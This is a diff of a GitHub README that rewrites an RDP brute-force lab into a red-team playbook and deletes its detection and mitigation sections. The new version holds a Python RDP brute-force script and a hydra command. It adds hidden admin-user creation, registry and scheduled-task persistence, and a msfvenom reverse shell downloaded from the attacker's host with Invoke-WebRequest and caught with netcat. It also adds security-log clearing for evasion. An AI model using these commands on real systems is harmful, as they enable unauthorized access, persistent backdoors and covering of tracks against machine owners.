@@ -1,124 +1,238 @@
-# Simulated RDP Brute Force Attack on Windows (Ethical Lab)
+Advanced RDP Red Teaming Lab
 
-## Disclaimer
-> This project is for **educational and research purposes only**. All testing was done in an **isolated lab environment** on virtual machines I own. Never attempt this on networks or systems you do not have explicit permission to test.
+Disclaimer
 
----
+> This project is for educational purposes only. All activities were conducted in a safe, isolated lab environment using virtual machines I own. Do not attempt this on any system you do not have explicit permission to test.
 
-## 1. Project Objective
 
-To simulate how an attacker could gain unauthorized access to a Windows machine via Remote Desktop Protocol (RDP) by brute-forcing weak credentials — and document how such attempts can be detected and prevented.
+
 
 ---
 
-## 2. Lab Setup
+Table of Contents
 
-| Component     | Tool Used          | Specs                      |
-|--------------|--------------------|----------------------------|
-| Host OS      | Windows/Linux/macOS| Runs VirtualBox or VMware |
-| Attacker VM  | Kali Linux         | With `hydra`, `nmap`       |
-| Target VM    | Windows 10         | RDP enabled, weak password |
-| Network Mode | Host-Only Adapter  | No external network access |
+Objective
 
----
+Lab Setup
 
-## 3. Steps to Set Up
+Recon & Scanning
 
-### Windows VM (Target) Setup
-1. Install Windows 10 in VirtualBox/VMware.
-2. Create a **local account** named `Administrator` with a **weak password** (e.g., `123456`).
-3. Enable Remote Desktop:
-   - **System Properties > Remote > Enable Remote Desktop**
-4. Get IP with:
-   ```cmd
-   ipconfig
-   ```
-5. Turn off Firewall (for testing only):
-   ```cmd
-   netsh advfirewall set allprofiles state off
-   ```
+RDP Brute-Force
 
-### Kali Linux (Attacker) Setup
-1. Boot Kali.
-2. Install tools:
-   ```bash
-   sudo apt update
-   sudo apt install hydra nmap xfreerdp
-   ```
-3. Ping Windows IP to verify connectivity:
-   ```bash
-   ping <windows_ip>
-   ```
+Python Script
+
+Access & Post-Exploitation
+
+Privilege Escalation
+
+Persistence
+
+Backdoor Shell
+
+Lateral Movement
+
+Clean-Up
+
+Reporting
+
+
 
 ---
 
-## 4. Scanning the Target
+Objective
 
-Use Nmap to confirm the RDP port is open:
-```bash
-nmap -p 3389 <windows_ip>
-```
+Simulate a real-world red team operation by brute-forcing weak RDP credentials, then performing post-exploitation, persistence, and potential lateral movement on the compromised host.
+
 
 ---
 
-## 5. Brute-Force RDP Credentials with Hydra
+Lab Setup
 
-Use a common wordlist (like rockyou):
-```bash
-cd /usr/share/wordlists/
-sudo gunzip rockyou.txt.gz
-hydra -t 4 -vV -f -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<window ip>
-```
-
-If successful, Hydra will show:
-```
-[3389][rdp] host: 192.168.56.101   login: Administrator   password: 123456
-```
 
 ---
 
-## 6. Gaining Access via RDP
+Recon & Scanning
 
-Use the credentials with:
-```bash
-xfreerdp /u:Administrator /p:123456 /v:<windows_ip>
-```
+Scan RDP port with Nmap:
 
-This opens a remote desktop session with Administrator access.
+nmap -p 3389 <target_ip>
+
 
 ---
 
-## 7. Detection (On Windows VM)
+RDP Brute-Force
 
-Open Event Viewer and monitor:
-- `Windows Logs > Security`
-- `Applications and Services Logs > Microsoft > Windows > TerminalServices-RemoteConnectionManager`
+Use hydra:
 
-Look for:
-- Multiple failed login attempts.
-- Successful login events.
+hydra -t 8 -V -l Administrator -P shortlist.txt rdp://<target_ip>
 
----
+Or use the Python script below.
 
-## 8. Mitigations
-
-- Enforce strong passwords.
-- Set account lockout policy.
-- Enable IP-based RDP restrictions.
-- Use Multi-Factor Authentication.
-- Actively monitor Event Logs.
 
 ---
 
-## 9. Conclusion
+Python Script
 
-This project demonstrates how weak credentials can be brute-forced on exposed RDP services. It emphasizes the need for secure configurations, logging, and proactive monitoring to prevent unauthorized access.
+import subprocess
+import time
+
+# Replace with your target IP and wordlist
+target_ip = "192.168.56.101"
+username = "Administrator"
+wordlist_path = "shortlist.txt"
+success_log = "rdp_success.txt"
+
+def attempt_login(password):
+    password = password.strip()
+    command = [
+        "xfreerdp",
+        f"/u:{username}",
+        f"/p:{password}",
+        f"/v:{target_ip}",
+        "/cert:ignore"
+    ]
+    try:
+        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
+        if b"connected" in result.stdout.lower():
+            print(f"[+] SUCCESS: {password}")
+            with open(success_log, "a") as f:
+                f.write(f"{username}:{password}\n")
+            return True
+        else:
+            print(f"[-] Failed: {password}")
+    except Exception as e:
+        print(f"[!] Error: {str(e)}")
+    return False
+
+with open(wordlist_path, "r", encoding="latin-1") as f:
+    for line in f:
+        password = line.strip()
+        if attempt_login(password):
+            break
+        time.sleep(1)
+
+Run with:
+
+python3 rdp_bruteforce.py
+
 
 ---
 
-## .gitignore
+Access & Post-Exploitation
 
-```
+xfreerdp /u:Administrator /p:<password> /v:<target_ip> /cert:ignore
+
+Inside RDP Session:
+
+whoami
+hostname
+ipconfig /all
+systeminfo
+dir /s /b C:\\Users\\*.txt
+
+
+---
+
+Privilege Escalation
+
+Check permissions:
+
+whoami /groups
+
+Run WinPEAS/SharpUp for local exploits (upload via RDP). Look for:
+
+AlwaysInstallElevated
+
+Unquoted service paths
+
+Weak service permissions
+
+
+
+---
+
+Persistence
+
+Add hidden admin user:
+
+net user sysadmin P@ssw0rd123 /add
+net localgroup administrators sysadmin /add
+
+Registry-based persistence:
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d "C:\\rev.exe"
+
+Scheduled Task:
+
+schtasks /create /tn "Updater" /tr "C:\\rev.exe" /sc onlogon
+
+
+---
+
+Backdoor Shell
+
+Generate backdoor:
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o rev.exe
+python3 -m http.server 80
+
+Download in RDP:
+
+powershell -c "Invoke-WebRequest -Uri http://<kali_ip>/rev.exe -OutFile C:\\rev.exe"
+
+Execute & catch:
+
+nc -lvnp 4444
+
+
+---
+
+Lateral Movement
+
+net view /domain
+net view \\<hostname>
+
+Reuse dumped credentials to access other machines if available.
+
+
+---
+
+Clean-Up
+
+Clear logs (not recommended unless simulating attacker evasion):
+
+wevtutil cl Security
+wevtutil cl System
+
+Delete backdoors, users, and payloads.
+
+
+---
+
+Reporting
+
+Document:
+
+Entry vector
+
+Credentials cracked
+
+Privilege escalation method
+
+Persistence mechanism
+
+Tools/scripts used
+
+Detection logs
+
+Mitigation recommendations
+
+
+
+---
+
+.gitignore
+
 *.log
 *.pcap
 *.cap
@@ -133,7 +247,9 @@ __pycache__/
 .idea/
 .env
 output/
-```
 
-This `.gitignore` file helps exclude VM images, logs, wordlists, and other large or sensitive files from your GitHub repository.
+
+---
+
+End of README
 
